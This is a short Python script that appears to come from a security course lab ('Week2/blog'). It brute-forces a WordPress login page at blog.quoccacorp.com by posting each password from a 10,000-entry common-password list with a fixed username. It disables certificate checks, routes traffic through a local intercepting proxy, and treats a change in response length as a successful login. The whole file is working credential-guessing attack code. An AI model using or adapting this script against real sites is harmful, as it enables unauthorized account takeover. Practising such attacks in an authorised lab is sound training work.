import requests
import re

proxies = {
  'https': 'http://127.0.0.1:8080',
}
requests.packages.urllib3.disable_warnings() 
def spiderman(): 
  headers = {
  "Host": "blog.quoccacorp.com",
  "Cookie": "wordpress_test_cookie=WP%20Cookie%20check",
  "Content-Length": "114",
  "Cache-Control": "max-age=0",
  "Sec-Ch-Ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
  "Sec-Ch-Ua-Mobile": "?0",
  "Sec-Ch-Ua-Platform": '"Linux"',
  "Origin": "https://blog.quoccacorp.com",
  "Content-Type": "application/x-www-form-urlencoded",
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-User": "?1",
  "Sec-Fetch-Dest": "document",
  "Referer": "https://blog.quoccacorp.com/wp-login.php",
  "Accept-Encoding": "gzip, deflate, br",
  "Priority": "u=0, i"
  }
  payload_template = {
"log": "Ihaveabadpassword",  # Username
"pwd": "",            # Password (to be filled)
"wp-submit": "Log In",
"redirect_to": "https://blog.quoccacorp.com/wp-admin/",
"testcookie": "1"
}
  with open("Week2/blog/10k-most-common.txt", "r") as f:
    for line in f:
      pwd = line.strip('\n')
      print("Trying password: ", pwd, end="\r")
      payload_template["pwd"] = pwd
      r = requests.post("https://blog.quoccacorp.com/wp-login.php", headers=headers,data=payload_template,proxies=proxies, verify=False)
      #print(r.headers)
      if r.headers["Content-Length"] != '4945':
        print()
        return pwd



print("password", spiderman())
